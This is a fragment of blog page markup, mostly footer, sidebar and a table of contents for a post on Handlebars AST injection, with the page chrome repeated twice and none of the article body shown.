href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/">https://tyaoo.github.io/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div><div class="post_share"><div class="social-share" data-image="/img/banner.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"><img class="prev-cover" src="/img/banner.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Tomcat内存马</div></div></a></div><div class="next-post pull-right"><a href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"><img class="next-cover" src="/img/banner.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Dubbo反序列化漏洞研究</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">原理图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">2.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-number">3.1.</span> <span class="toc-text">调用栈</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E5%85%A5%E5%8F%A3"><span class="toc-number">3.2.</span> <span class="toc-text">解析入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90AST"><span class="toc-number">3.3.</span> <span class="toc-text">解析AST</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">3.4.</span> <span class="toc-text">编译环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E6%A8%A1%E6%9D%BF"><span class="toc-number">3.5.</span> <span class="toc-text">编译模板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%A8%A1%E6%9D%BF"><span class="toc-number">3.6.</span> <span class="toc-text">生成模板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toc-number">3.7.</span> <span class="toc-text">模板函数执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E6%B1%A1%E6%9F%93%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">3.8.</span> <span class="toc-text">被污染的函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">5.</span> <span class="toc-text">拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BooleanLiteral"><span class="toc-number">5.1.</span> <span class="toc-text">BooleanLiteral</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PartialStatement"><span class="toc-number">5.2.</span> <span class="toc-text">PartialStatement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PartialBlockStatement"><span class="toc-number">5.3.</span> <span class="toc-text">PartialBlockStatement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BlockStatement"><span class="toc-number">5.4.</span> <span class="toc-text">BlockStatement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Decorator"><span class="toc-number">5.5.</span> <span class="toc-text">Decorator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#inf-Hash"><span class="toc-number">5.6.</span> <span class="toc-text">inf Hash</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>
